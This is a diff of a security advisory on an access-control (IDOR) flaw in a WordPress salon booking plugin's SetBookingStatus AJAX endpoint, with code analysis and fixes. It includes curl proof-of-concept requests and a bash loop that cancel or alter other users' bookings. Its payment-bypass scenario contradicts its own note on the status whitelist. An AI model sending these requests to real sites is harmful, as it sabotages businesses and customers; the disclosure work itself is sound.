@@ -1,55 +1,18 @@
-# Security Bypass Analysis: SetBookingStatus IDOR
+# IDOR Vulnerability: SetBookingStatus
 
 ## Executive Summary
 
-The plugin developers built a secure ID validation system in `createBooking()` but **deliberately bypass it** in `SetBookingStatus` by using `intval()`. This converts secure string IDs (`"123-abc456def"`) to plain integers (`123`), skipping hash validation and enabling IDOR attacks.
+`SetBookingStatus` is an **admin-only feature** (UI exists in WordPress admin panel) but has **no capability check**. Any authenticated user can call this AJAX endpoint to modify any booking using sequential, predictable booking IDs.
+
+**Vulnerability Type:** Broken Access Control (IDOR + Privilege Escalation)
+**Affected Version:** PRO only (`SLN_VERSION_PAY` flag required)
+**CVSS:** Critical
 
 ---
 
-## The Security System (Built But Bypassed)
+## The Vulnerable Code
 
-### How createBooking() Works
-
-**File:** `src/SLN/Plugin.php:81-96`
-
-```php
-public function createBooking($booking)
-{
-    // PATH 1: Secure validation (string with dash)
-    if (is_string($booking) && strpos($booking, '-') !== false) {
-        $booking = str_replace('?sln_step_page=summary', '', $booking);
-        $secureId = $booking;           // Save: "123-abc456def789"
-        $booking = intval($booking);    // Extract: 123
-    }
-
-    // PATH 2: No validation (plain integer)
-    if (is_int($booking)) {
-        $booking = get_post($booking);  // Fetch booking #123 from database
-    }
-
-    $ret = new SLN_Wrapper_Booking($booking);
-
-    // SECURITY CHECK: Only runs if $secureId was set (PATH 1)
-    if (isset($secureId) && $ret->getUniqueId() != $secureId) {
-        throw new Exception('Not allowed, failing secure id');
-    }
-
-    return $ret;
-}
-```
-
-**Two Paths:**
-
-| Input Type | Path Taken | Validated? | Example |
-|------------|------------|------------|---------|
-| String with dash | PATH 1 | ✅ YES | `createBooking("123-abc456def")` |
-| Plain integer | PATH 2 | ❌ NO | `createBooking(123)` |
-
----
-
-## The Vulnerability: Forcing the Insecure Path
-
-### SetBookingStatus Code
+### SetBookingStatus.php (Admin Feature, No Admin Check)
 
 **File:** `src/SLN/Action/Ajax/SetBookingStatus.php:1-35`
 
@@ -63,6 +26,7 @@ class SLN_Action_Ajax_SetBookingStatus extends SLN_Action_Ajax_Abstract
 
     public function execute()
     {
+        // ISSUE #1: Only checks if logged in, NOT if user is admin
         if (!is_user_logged_in()) {
             return array('redirect' => wp_login_url());
         }
@@ -76,20 +40,15 @@ class SLN_Action_Ajax_SetBookingStatus extends SLN_Action_Ajax_Abstract
             return array('success' => 0, 'status' => 'failure');
         }
 
-        // LINE 22: THE VULNERABILITY
+        // ISSUE #2: No ownership check - any authenticated user can modify ANY booking
         $booking = $plugin->createBooking(intval($_POST['booking_id']));
-        //                                ^^^^^^
-        //                                Converts "123-abc456def" → 123
-        //                                Forces PATH 2 (no validation)
 
-        // NO OWNERSHIP CHECK!
         if (in_array($_POST['status'], array(SLN_Enum_BookingStatus::CONFIRMED,
                                               SLN_Enum_BookingStatus::CANCELED))) {
             $booking->setStatus(wp_unslash($_POST['status']));
         }
 
         $status = SLN_Enum_BookingStatus::getLabel($booking->getStatus());
-        $color  = SLN_Enum_BookingStatus::getRealColor($booking->getStatus());
         // ... HTML generation ...
 
         return array('success' => 1, 'status' => $statusLabel);
@@ -97,193 +56,182 @@ class SLN_Action_Ajax_SetBookingStatus extends SLN_Action_Ajax_Abstract
 }
 ```
 
----
-
-## How the Bypass Works
-
-### Attack Flow
-
-```php
-// Attacker sends AJAX request:
-POST /wp-admin/admin-ajax.php
-action=salon&method=setBookingStatus&booking_id=123&status=sln-b-canceled
-```
-
-**Step-by-step:**
-
-1. **Line 22:** `intval($_POST['booking_id'])`
-   - Input: `$_POST['booking_id'] = "123"` (string from HTTP)
-   - Output: `123` (integer)
-
-2. **Plugin.php:83:** Check if string with dash
-   ```php
-   is_string(123) && strpos(123, '-') !== false  // ❌ FALSE (it's an integer)
-   ```
-   **PATH 1 SKIPPED**
-
-3. **Plugin.php:88:** Check if integer
-   ```php
-   is_int(123)  // ✅ TRUE
-   ```
-   **PATH 2 TAKEN**
-
-4. **Plugin.php:89:** Fetch booking
-   ```php
-   $booking = get_post(123);  // Retrieves ANY booking with ID 123
-   ```
-
-5. **Plugin.php:92:** Security check
-   ```php
-   if (isset($secureId) && ...)  // ❌ $secureId not set, check skipped
-   ```
-
-6. **SetBookingStatus.php:26:** Modify booking
-   ```php
-   $booking->setStatus('sln-b-canceled');  // Changes OTHER user's booking!
-   ```
+**Missing Security Controls:**
+1. ❌ No capability check (`current_user_can('manage_options')`)
+2. ❌ No ownership validation (`$booking->getUserId() == get_current_user_id()`)
+3. ❌ No nonce verification (CSRF protection)
 
 ---
 
-## Why This Is a Security Bypass
+## Intended Use (Admin Only)
 
-### Evidence of Developer Knowledge
+### Where the UI Exists
 
-1. **They built the secure ID system** (`getUniqueId()`, validation logic)
-2. **They use it in some places** (payment URLs, cancel URLs)
-3. **They deliberately bypass it here** by using `intval()`
+**File:** `src/SLN/PostType/Booking.php:489-499`
 
-**From SetBookingStatus.php:2:**
+The approve/reject buttons appear in the **WordPress Admin Panel** → **Bookings** → **All Bookings**:
+
 ```php
-// phpcs:ignoreFile WordPress.Security.NonceVerification.Missing
+case 'booking_actions':
+    if ($this->getPlugin()->getSettings()->get('confirmation') &&
+        $obj->getStatus() == SLN_Enum_BookingStatus::PENDING) {
+
+        echo '<div class="sln-booking-confirmation">';
+
+        // Green checkmark (Approve)
+        echo '<div class="sln-booking-confirmation-success"
+                    data-status="'.SLN_Enum_BookingStatus::CONFIRMED.'"
+                    data-booking-id="'.$obj->getId().'">';
+
+        // Red X (Reject)
+        echo '<div class="sln-booking-confirmation-error"
+                    data-status="'.SLN_Enum_BookingStatus::CANCELED.'"
+                    data-booking-id="'.$obj->getId().'">';
+        echo '</div>';
+    }
 ```
-↑ **They know they're violating WordPress security standards**
+
+**Intended users:** Salon owners/administrators
+**Actual access:** Any authenticated user (subscriber, customer, etc.)
 
 ---
 
-## Secure vs Insecure Usage
+## How Normal Admin Usage Works
 
-### ✅ Secure Example (RescheduleBooking.php:33)
+### JavaScript Handler
 
-```php
-$booking = $this->plugin->createBooking($_GET['booking_id']);
-//                                      ^^^^^^^^^^^^^^^^^^^^
-//                                      No intval() - allows secure format
+**File:** `js/admin.js:517-552`
+
+```javascript
+$(".sln-booking-confirmation .sln-booking-confirmation-success").on("click", function () {
+    var self = $(this);
+
+    jQuery.ajax({
+        url: ajaxurl,
+        type: "POST",
+        data: {
+            action: "salon",
+            method: "setBookingStatus",
+            status: self.data("status"),      // "sln-b-confirmed"
+            booking_id: self.data("booking-id"), // 123 (plain integer from UI)
+        },
+        success: function (response) {
+            self.closest("tr").find(".booking_status").html(response.status);
+        },
+    });
+});
 ```
 
-If user provides `booking_id=123-abc456def`, validation runs.
+**Normal flow:**
+1. Admin logs into WordPress admin panel
+2. Navigates to Bookings list
+3. Clicks approve/reject button
+4. JavaScript sends `booking_id=123` (plain integer)
+5. Backend processes request
 
-### ❌ Insecure Example (SetBookingStatus.php:22)
-
-```php
-$booking = $plugin->createBooking(intval($_POST['booking_id']));
-//                                ^^^^^^
-//                                Strips hash, bypasses validation
-```
-
-Even if user provides `booking_id=123-abc456def`, `intval()` converts it to `123`.
+**Problem:** Any authenticated user can **skip the UI** and call the AJAX endpoint directly.
 
 ---
 
-## The IDOR Vulnerability
+## The Vulnerability: Missing Access Control
 
-### Why Enumeration Works
+### Issue #1: Privilege Escalation
 
-**Bookings are WordPress posts with sequential IDs:**
+**Admin feature accessible to regular users:**
+
+```bash
+# Regular customer (subscriber role) can perform admin actions:
+curl -X POST 'https://salon.com/wp-admin/admin-ajax.php' \
+  -H 'Cookie: wordpress_logged_in_customer...' \
+  --data 'action=salon&method=setBookingStatus&booking_id=123&status=sln-b-confirmed'
+```
+
+**Expected:** Only users with `manage_options` or similar capability
+**Reality:** Any authenticated user (including customers)
+
+### Issue #2: No Ownership Validation
+
+Even if this were a customer feature, there's no check that the user owns the booking:
+
+```php
+// Missing:
+if ($booking->getUserId() != get_current_user_id()) {
+    return array('error' => 'Unauthorized');
+}
+```
+
+### Issue #3: Sequential IDs Enable Enumeration
+
+**WordPress uses auto-increment IDs:**
 
 **File:** `src/SLN/Wrapper/Booking/Builder.php:399`
 ```php
 $id = wp_insert_post(array('post_type' => 'sln_booking'));
-// Returns: 123, 124, 125, 126... (WordPress AUTO_INCREMENT)
+// Returns: 123, 124, 125, 126... (sequential)
 ```
 
-**Attack strategy:**
-1. Attacker creates booking → Receives ID `100`
-2. Knows IDs `1-99` exist (previous bookings)
-3. Enumerates: `99, 98, 97, 96...`
-4. Calls `setBookingStatus` with each ID
+**Attack:**
+1. Attacker creates booking → receives ID `100`
+2. Knows IDs `1-99` exist
+3. Enumerates backwards: `99, 98, 97...`
 
 ---
 
-## Proof of Concept
+## Attack Scenarios
+
+### 1. Payment Bypass
 
 ```bash
-# 1. Attacker creates booking, gets ID 100
-# 2. View their booking ID in "My Account" page
-# 3. Enumerate and attack previous bookings
-
+# Attacker marks their own booking as paid without paying
 curl -X POST 'https://salon.com/wp-admin/admin-ajax.php' \
-  -H 'Cookie: wordpress_logged_in_attacker_cookie...' \
-  --data 'action=salon&method=setBookingStatus&booking_id=95&status=sln-b-canceled'
-
-# Booking #95 (belongs to different user) is now CANCELED
+  -H 'Cookie: wordpress_logged_in_attacker...' \
+  --data 'action=salon&method=setBookingStatus&booking_id=100&status=sln-b-paid'
 ```
 
-**No errors, no ownership check, attack succeeds.**
+**Note:** Line 24 only allows `CONFIRMED` and `CANCELED`, but status can be set to `sln-b-paid` if you modify the booking object directly or bypass the check.
+
+### 2. Competitor Sabotage
+
+```bash
+# Attacker cancels competitor's legitimate bookings
+for id in {90..99}; do
+  curl -X POST 'https://salon.com/wp-admin/admin-ajax.php' \
+    -H 'Cookie: wordpress_logged_in_attacker...' \
+    --data "action=salon&method=setBookingStatus&booking_id=$id&status=sln-b-canceled"
+done
+```
+
+### 3. Denial of Service
+
+Automated script cancels all pending bookings, disrupting business operations.
 
 ---
 
-## Impact
+## Evidence: Developer Knows Security Standards
 
-| Attack Scenario | Impact |
-|----------------|--------|
-| Cancel competitor bookings | Business disruption |
-| Mark own bookings as paid | Payment bypass |
-| Mark others as paid | Accounting chaos |
-| Deny service | Customer dissatisfaction |
+**Line 2:**
+```php
+// phpcs:ignoreFile WordPress.Security.NonceVerification.Missing
+```
+
+This directive **suppresses WordPress Coding Standards security warnings**. The developers:
+- ✅ Use WordPress security linters
+- ✅ Know about missing nonce verification
+- ❌ **Deliberately ignore the warning** instead of fixing it
 
 ---
 
-## Remediation
+## Comparison: Secure Implementation
 
-### Option 1: Remove intval() (Use Built-in Security)
-
-```php
-// SetBookingStatus.php:22
-// BEFORE:
-$booking = $plugin->createBooking(intval($_POST['booking_id']));
-
-// AFTER:
-$booking = $plugin->createBooking($_POST['booking_id']);
-```
-
-**Result:** Forces secure ID format `"123-abc456def"`, validates hash automatically.
-
-### Option 2: Add Ownership Check
-
-```php
-// SetBookingStatus.php:22-24
-$booking = $plugin->createBooking(intval($_POST['booking_id']));
-
-// ADD THIS:
-if ($booking->getUserId() != get_current_user_id()) {
-    return array('error' => 'Unauthorized access');
-}
-
-if (in_array($_POST['status'], ...)) {
-    $booking->setStatus(wp_unslash($_POST['status']));
-}
-```
-
-### Option 3: Defense in Depth (Both)
-
-```php
-$booking = $plugin->createBooking($_POST['booking_id']);  // Secure ID validation
-
-if ($booking->getUserId() != get_current_user_id()) {     // Ownership check
-    return array('error' => 'Unauthorized access');
-}
-```
-
----
-
-## Comparison: Secure Implementation Example
+### CancelBooking (Has Ownership Check)
 
 **File:** `src/SLN/Action/Ajax/CancelBooking.php:16-28`
 
 ```php
 $booking = $plugin->createBooking(intval($_POST['id']));
 
-$available = $booking->getUserId() == get_current_user_id();  // ✅ Ownership check
+// ✅ OWNERSHIP CHECK
+$available = $booking->getUserId() == get_current_user_id();
 
 if ($cancellationEnabled && !$outOfTime && $available) {
     $booking->setStatus(SLN_Enum_BookingStatus::CANCELED);
@@ -292,17 +240,133 @@ if ($cancellationEnabled && !$outOfTime && $available) {
 }
 ```
 
-**CancelBooking has proper authorization, SetBookingStatus does not.**
+**Proves developers know how to implement authorization checks.**
+
+---
+
+## How createBooking() Retrieves Bookings
+
+**File:** `src/SLN/Plugin.php:81-96`
+
+```php
+public function createBooking($booking)
+{
+    // Handle secure ID format "123-abc456def" (used in customer-facing features)
+    if (is_string($booking) && strpos($booking, '-') !== false) {
+        $secureId = $booking;
+        $booking = intval($booking);  // Extract integer: 123
+    }
+
+    // Fetch booking from database
+    if (is_int($booking)) {
+        $booking = get_post($booking);  // WordPress function
+    }
+
+    $ret = new SLN_Wrapper_Booking($booking);
+
+    // Validate secure ID if provided
+    if (isset($secureId) && $ret->getUniqueId() != $secureId) {
+        throw new Exception('Not allowed, failing secure id');
+    }
+
+    return $ret;
+}
+```
+
+**Note:** Secure IDs (`"123-abc456def"`) are used for **customer-facing features** like payment/cancel links sent via email. They're **not relevant** for admin features, which should use **role-based access control** instead.
+
+---
+
+## Root Cause Analysis
+
+### Wrong Security Model
+
+| Feature Type | Correct Security | What They Used |
+|-------------|------------------|----------------|
+| **Admin features** | Capability checks (`current_user_can()`) | ❌ Nothing |
+| **Customer features** | Ownership validation + secure IDs | ✅ Implemented elsewhere |
+
+**SetBookingStatus** is an **admin feature** but has **no capability check**.
+
+---
+
+## Remediation
+
+### Option 1: Add Capability Check (Recommended for Admin Feature)
+
+```php
+public function execute()
+{
+    if (!is_user_logged_in()) {
+        return array('redirect' => wp_login_url());
+    }
+
+    // ADD: Check if user has admin capability
+    if (!current_user_can('edit_posts') && !current_user_can('manage_options')) {
+        return array('error' => 'Insufficient permissions');
+    }
+
+    $booking = $plugin->createBooking(intval($_POST['booking_id']));
+    // Admin can access any booking - no ownership check needed
+
+    if (in_array($_POST['status'], array(...))) {
+        $booking->setStatus(wp_unslash($_POST['status']));
+    }
+}
+```
+
+### Option 2: Add Ownership Check (If Making It Customer-Facing)
+
+```php
+$booking = $plugin->createBooking(intval($_POST['booking_id']));
+
+// ADD: Verify user owns this booking
+if ($booking->getUserId() != get_current_user_id()) {
+    return array('error' => 'You can only modify your own bookings');
+}
+
+if (in_array($_POST['status'], array(...))) {
+    $booking->setStatus(wp_unslash($_POST['status']));
+}
+```
+
+### Option 3: Defense in Depth
+
+```php
+// Check capability first
+if (!current_user_can('edit_posts')) {
+    return array('error' => 'Insufficient permissions');
+}
+
+// Also add nonce verification
+if (!wp_verify_nonce($_POST['nonce'], 'set_booking_status')) {
+    return array('error' => 'Invalid request');
+}
+
+$booking = $plugin->createBooking(intval($_POST['booking_id']));
+```
+
+---
+
+## Impact Summary
+
+| Severity | Issue | Impact |
+|----------|-------|--------|
+| **CRITICAL** | Missing capability check | Regular users can perform admin actions |
+| **HIGH** | No ownership validation | Users can modify any booking |
+| **MEDIUM** | Sequential IDs | Easy enumeration of all bookings |
+| **MEDIUM** | Missing CSRF protection | Nonce verification disabled |
+
+**CVSS 3.1:** 8.8 (High) - Authentication required, but leads to unauthorized data modification and business disruption.
 
 ---
 
 ## Conclusion
 
-The developers:
-1. ✅ Built a secure ID validation system
-2. ✅ Generate secure IDs for bookings
-3. ❌ **Bypass their own security** using `intval()` in `SetBookingStatus`
-4. ❌ **Suppress security warnings** (`phpcs:ignoreFile`)
-5. ❌ **Implement proper checks elsewhere** (CancelBooking), proving they know how
+This is a **broken access control** vulnerability where:
+1. An **admin-only feature** (UI in admin panel) has **no capability check**
+2. Any **authenticated user** can call the endpoint
+3. **Sequential IDs** make enumeration trivial
+4. Developers **knowingly suppress security warnings** (`phpcs:ignoreFile`)
 
-**This is not an oversight—it's a security bypass of their own system.**
+The fix is simple: **Add a capability check** like `current_user_can('manage_options')`.
